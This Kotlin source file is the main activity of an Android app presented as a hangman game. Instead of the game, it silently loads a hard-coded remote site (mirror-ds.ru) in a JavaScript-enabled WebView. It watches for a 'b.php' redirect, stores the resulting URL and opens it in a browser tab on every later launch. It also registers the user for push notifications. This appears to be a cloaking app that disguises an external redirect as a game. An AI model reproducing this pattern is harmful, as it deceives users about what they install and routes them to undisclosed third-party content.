package com.sososoftware.hangman

import android.annotation.SuppressLint
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.content.ContextCompat
import com.onesignal.OneSignal
import com.sososoftware.hangman.utils.CPref
import com.sososoftware.hangman.utils.LangPref
import com.sososoftware.hangman.utils.Pref
import kotlinx.android.synthetic.main.activity_main.*


class MainActivity : AppCompatActivity() {

    var sPrefUri :Pref? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        sPrefUri = Pref(this).apply { getSp("kek") }
        setContentView(R.layout.activity_main)
        val url = sPrefUri?.getStr("url")
        if(url != null)
            open(url)
        else rozetka()

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        // OneSignal Initialization
        OneSignal.startInit(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()
    }

    fun getLang(): String? {
        return LangPref(this).getLang()
    }

     fun open(url : String){
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }

    @SuppressLint("SetJavaScriptEnabled")
    fun rozetka(){
        rozetka_b.settings.javaScriptEnabled = true
        rozetka_b.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("Lol", "sooqa")
                Log.e("kek", request?.url.toString())
                val req = request?.url.toString()
                if(req.contains("b.php")) {
                    sPrefUri?.putStr("url", "http://mirror-ds.ru")
                    open(req)
                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        rozetka_b.loadUrl("http://mirror-ds.ru")
    }

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    override fun onResume() {
        super.onResume()
        val color = CPref(this).getColor()
        if(color != -1 && color != null)
            changeBackGroundColor()
    }

    private fun changeBackGroundColor(){
        val color = CPref(this).getColor()
        color?.let {
            main_root.setBackgroundColor(it)
            window.statusBarColor = color
        }
    }
}